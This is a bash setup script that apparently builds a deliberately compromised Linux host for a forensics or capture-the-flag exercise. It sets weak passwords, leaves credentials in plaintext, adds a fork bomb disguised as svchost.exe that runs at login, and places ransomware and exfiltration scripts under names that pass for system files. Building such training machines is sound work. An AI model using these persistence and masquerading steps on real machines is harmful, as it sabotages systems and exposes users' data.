# get git, apache, php, nmap, wireshark, ssh, python2

# set root crontab to start httpd

# set up networking
#echo "nameserver 192.168.1.1" > /etc/resolv.conf
#sudo route add default gw 192.168.1.1

# start ssh
systemctl start ssh

# add users
bash add_users.bash

# set password for allan_1
echo "allan_1:password" | chpasswd

# set password for adamjohnson
echo "adamjohnson:password" | chpasswd

# add folder to adamjohnson
mkdir /home/adamjohnson/Files

# generate hashes and move to adamjohnson as root
bash generate_hashes.bash
cp hashes /home/adamjohnson/Files

# copy password file
cp passwords.txt /home/jacob_2/
chown jacob_2 /home/jacob_2/passwords.txt

# copy fork bomb
make
cp svchost.exe /usr/sbin/svchost.exe

# add run forkbomb upon login
touch /home/adamjohnson/.bash_login
echo '/usr/bin/svchost.exe' > /home/adamjohnson/.bash_login
echo 'echo "done"' >> /home/adamjohnson/.bash_login

# copy https user scripts to home directory
declare -a httpsusers=("jacob_1" "jacob_2" "sara_1" "brett_1")
for httpsuser in "${httpsusers[@]}"
do
	cp https_user.py /home/"$httpsuser"/"$httpsuser".py
	chown "$httpsuser" /home/"$httpsuser"/"$httpsuser".py
	chmod +x /home/"$httpsuser"/"$httpsuser".py
done

# copy IRC script to home directory
cp irc_client.py /home/Adminestrator/Adminestrator.py
chown Adminestrator /home/Adminestrator/Adminestrator.py
chmod 0 /home/Adminestrator/Adminestrator.py
chmod u+r /home/Adminestrator/Adminestrator.py

# copy ftp user
cp ftp_user.py /home/allan_1/allan_1.py
chown allan_1 /home/allan_1/allan_1.py
chmod 0 /home/allan_1/allan_1.py
chmod u+r /home/allan_1/allan_1.py

# copy bot_ping to file system
cp bot_ping.py /usr/bin/system_.exe
chmod +x /usr/bin/system_.exe

# copy ransomware daemon
cp ransom_server.py /sbin/system32.py
chmod +x /sbin/system32.py

# copy http post exfil
cp http_post_user.py /sbin/sysadmin
chmod +x /sbin/sysadmin

# copy email exfil
cp smtp_extract.py /bin/net32.dll
chmod +x /bin/net32.dll

# mount file share
echo "//192.168.1.2/share/hr/employees /home/manager/employees cifs username=manager,password=gowest,iocharset=utf8,sec=ntlm  0  0" >> /etc/fstab
